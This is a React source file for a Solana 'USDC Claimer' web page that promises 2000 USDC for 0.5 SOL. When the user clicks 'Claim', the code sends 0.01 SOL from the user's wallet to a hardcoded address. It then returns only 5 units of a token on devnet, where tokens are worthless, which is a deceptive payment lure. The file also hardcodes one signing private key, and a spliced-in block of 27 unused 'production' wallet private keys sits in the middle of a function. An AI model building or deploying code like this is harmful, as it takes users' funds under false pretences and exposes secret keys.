/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "54446u6DGwN79WtA2Qcc568Nu7HYKKy6ackJ1Qej9KBgZogQFc2bfzvBmT8Vuc7CjTzXXqpVqoTJD14zunBLdEAU"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3jsUXSwTEWx5hLq6KedB4kqUMgCV2Q93c4SRNLuPMgf8ppNAqS3xaqSPCBpY6G5KY1Wt3cFrDshxSz6XtwpkssVL",
  "key1": "2ku8bpPUtMq7Pd8Edsjm3CQ3Y6UWEw8DoVMHEAJUtTqtYU679B4wRhbAnskEym936RKGahMU7z8kEcH95yJRuWe7",
  "key2": "5B5mAvmG7T28pigkbSYtdVdwb25sdrCpBPeHCDeeEfMJzqgjdh59K9hv38G2MoF1qiVXNS9zViaxDwuwSBQzEvJ4",
  "key3": "uMqY4MhscL4sx6iEsVpvXE1JiBCvKQy6yicXYoGqao1XCNRH2AqyBCPM9HB5aXtJXFMbuhfsYihYaK4BdJveaiF",
  "key4": "66LDyJBjHtTrEFTiph9UQ6f45iHqYTEmJur4fq7z8FvdEDYuUBbkVPLEAExYAAut8tDCF4S1GRwoTd8RytcMFJAZ",
  "key5": "54N23FBxH8U6E1ZMUhNtn1DJ9HQeVn2PF1MoYGZiNHixzcKkRFpZroQpxN4XAGUUVMofnfL39YncXaxMhbUmv9jk",
  "key6": "5XxjtaUQWwm57LbRN4qicssTK8vZ2ksPRa91RqRapchnFSXF219bXHhn3bBxYUffUjWa7QSdPvvi8Kna6tsstiF9",
  "key7": "2TYQJ9KCXjzt1aJpySZgzWG3Ukp4DekJcdoqhaSmL5Gv5Jqsu3RuLbnf8Fvi5w376Bp11qououMSVwz3Hd2a13Hu",
  "key8": "2tK122dX6USreLAEGgk7NfhMpprmU6y9uFC6TNu6HuYeDUW6c6UmkRDuiWD4DhN8C1MY4XPes9tPFW8e4HgR4E34",
  "key9": "2guBro1fMr3j6Y7WnHcc4nobwHa2ZVwJhb8R6Lm8NciiFsCVweq4nzrgHiJTrmsgAE42E5dL2xd7mFWU5iP3GH7E",
  "key10": "JRtV3b569XdPGinvsNjGEmih3cEEXjHcSC2C7BNzNXbhFDZZWTgVBGZmBm7h3mzxMqNwmx9X7RecwLTj9yvrKBv",
  "key11": "5Bqsw5Bd4TrbQY1c7n6LDqJmg7dEAWC2J1acN2svqcs8Wm9b4HwRGH4MfVox1iv8gNywsGDkQF7TKs6FpTCa6akN",
  "key12": "4XMoS9iRdotyzV9jtfy6X7Dnn4dK3Ho5h2qshq6zQjhapxk2hbxM5AfXMrdMF8pwvdZ7iMNuK27JQjSDv2xysSRW",
  "key13": "3yFoX98svwQe5aF5p6F2AcL4HcjTBNc9k8d8kSooZGp5Y8hH5bUBKrqhTPydCNVWYZG4nKwGQCsEK3GnuWvkaP5W",
  "key14": "2VSw9W3NzQHhZdAKTLo8CPN47hy7kq4hCiB4e43MRkYdc7Pskg3zLLpwSkiNGSKF7hoiEtKQj52P2u5V4uvTsFKX",
  "key15": "5HBHmzgGSLFduJayu1CfatpozA1ED3vyDtP99FUWAXnF4yJNpUwv7FAPgE1cy2LhLg9cvPk1aiWKqow8BunNMr88",
  "key16": "3cG83FQNeeGhsXjU6X35MmHTGdHE7Lgcdr4DkchkkW2NdHLS9cytgXwPSuhkgSrJ1yhLQgntKo61ErhHKQg1pVve",
  "key17": "QpSqm6q9n5dv1uGaapAaXKBwsx5kM3UDqorwxfmQqkyA9VqkPY8qWEbPio7psNYZF6rs9Tm4BRvGik3RgwbF2pY",
  "key18": "2MW7feQAxAQWaC7bvc1ebgTywQWDrn2fJ5NuG9G1MyPMYr1pfeqsekwFqqrQEixkoHWDmDtgwv8fqCwWgDTTrZBb",
  "key19": "Q8Lcz8RNraUE7RdVL2riUpGAs7f7rvJn46xoWop8FAXscXYaHRdXwxPR1TRhhjRdScwx7MNPkRnSbTgUyUi6Zi3",
  "key20": "5Z1MAJ7AVVPmiAm7J7SLCNcAPUi3qmeWEoqu7aeanKoSBZfKPMsxMwr1uMHuGNXNLJ3oeHCFAZV3H4qnu8FXgxMY",
  "key21": "4rPqbnJ3RBEnMDArzsQR3v2C8HqrnuCSMD9oS8Rt1WPf3dWJBzGKxFxGesP8n1PGdwNBAj7Kn5oADawu5YJPKD8",
  "key22": "4TsTmzZvHiHsiQcr4z4W7vp4MGxgWn33iDJwyBVbNZhW59teUwAQ3J8GvPYAqsu2pBdvaHvsrT3bxdj18KWrBgic",
  "key23": "4ZJmgCYmvQyoNWoGtHQnFrBTFffeQfg38tbzdKxaALRLwGZ5akko2vcyFeP4NTGH2K1PvVg5aMoWVw6hUbrH6p1k",
  "key24": "4RzCx8Tuoiu6Mq2PUR3JaELdYgEbBwx351PJSQbybbJLGKpGWDYxoupDpH59ie978pJMqMW3VbTWo5i4PPT7Aqw7",
  "key25": "pgDC5dMfm2s8F396uRNGJkrjkPKpSYoe8Wn4sBsbeePALXd9AYiX1EbBjapq25F32VMuJFrDLcd5fwwzwe747KZ",
  "key26": "2xxWMTMXDcqY21r1xiLmrM4JS3TZGfSVyRjMKaH3yjW7cAZgZntyA8sFKFsbDsD836zVnR3Dv1P3RHoyEzFkc1zS"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
